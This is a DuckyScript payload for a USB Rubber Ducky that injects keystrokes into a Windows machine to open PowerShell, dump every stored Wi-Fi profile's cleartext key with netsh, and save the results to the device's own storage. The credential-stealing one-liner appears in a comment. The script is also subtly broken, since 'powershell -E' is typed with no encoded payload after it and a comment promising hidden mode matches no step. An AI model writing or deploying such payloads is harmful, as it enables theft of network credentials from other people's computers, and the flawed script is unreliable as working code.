REM First script on this rubber ducky. Used to give us wifi Passwords the system has stored 

REM Created by Stuffy 
REM This will set the attack mode as human interface device or keyboard and storage allows us to save the results
DELAY 3000
ATTACKMODE HID STORAGE
DELAY 3000
GUI r 
DELAY 2000
REM run cmd in hidden mode
STRING cmd
DELAY 1000
ENTER
DELAY 1000
STRING powershell
DELAY 1000
ENTER
DELAY 3000
REM ENCODED TEXT UNENCODED = $m=(Get-Volume -FileSystemLabel "DUCKY").DriveLetter; (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize  > $m":\"$env:computername".txt"
STRING powershell -E 
DELAY 2000
ENTER
DELAY 5000
STRING Exit
DELAY 1000
ENTER
DELAY 1000
STRING Exit
ENTER
